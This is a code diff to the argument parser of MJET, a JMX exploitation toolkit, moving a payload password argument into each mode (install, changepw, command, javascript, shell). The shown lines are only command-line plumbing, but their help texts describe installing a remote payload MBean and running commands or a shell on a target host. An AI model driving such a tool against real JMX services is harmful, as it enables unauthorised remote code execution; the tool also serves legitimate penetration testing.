@@ -383,13 +383,13 @@ print authorSignature
 parser = argparse.ArgumentParser(description = 'MJET allows an easy exploitation of insecure JMX services', epilog='--- MJET - MOGWAI LABS JMX Exploitation Toolkit ------------------', add_help=True)
 parser.add_argument('targetHost', help='target IP address')
 parser.add_argument('targetPort', help='target JMX service port')
-parser.add_argument('password', help="the required password to access the payload methods")
 parser.add_argument('--jmxrole', help='remote JMX role')
 parser.add_argument('--jmxpassword', help='remote JMX password')
 subparsers = parser.add_subparsers(title='modes', description='valid modes', help='use ... MODE -h for help about specific modes')
 
 # Install mode
 install_subparser = subparsers.add_parser('install', help='install the payload MBean on the target')
+install_subparser.add_argument('password', help="the password that should be set after successful installation")
 install_subparser.add_argument('payload_url', help='URL to load the payload (full URL)')
 install_subparser.add_argument('payload_port', help='port to load the payload')
 
@@ -400,22 +400,26 @@ uninstall_subparser = subparsers.add_parser('uninstall', help='uninstall the pay
 uninstall_subparser.set_defaults(func=arg_uninstall_mode)
 
 # Password mode
-install_subparser = subparsers.add_parser('password', help='change the payload password on the target')
-install_subparser.add_argument('newpass', help='The new password')
-install_subparser.set_defaults(func=arg_password_mode)
+password_subparser = subparsers.add_parser('changepw', help='change the payload password on the target')
+password_subparser.add_argument('password', help="the password to access the installed MBean")
+password_subparser.add_argument('newpass', help='The new password')
+password_subparser.set_defaults(func=arg_password_mode)
 
 # Command mode
 command_subparser = subparsers.add_parser('command', help='execute a command in the target')
+command_subparser.add_argument('password', help="the password to access the installed MBean")
 command_subparser.add_argument('cmd', help='command to be executed')
 command_subparser.set_defaults(func=arg_command_mode)
 
 # Javascript mode
 script_subparser = subparsers.add_parser('javascript', help='execute JavaScript code from a file in the target')
+script_subparser.add_argument('password', help="the password to access the installed MBean")
 script_subparser.add_argument('filename', help='file with the JavaScript code to be executed')
 script_subparser.set_defaults(func=arg_script_mode)
 
 # Shell mode
 shell_subparser = subparsers.add_parser('shell', help='open a simple command shell in the target')
+shell_subparser.add_argument('password', help="the required password to access the payload methods")
 shell_subparser.set_defaults(func=arg_shell_mode)
 
 # Deserialization mode
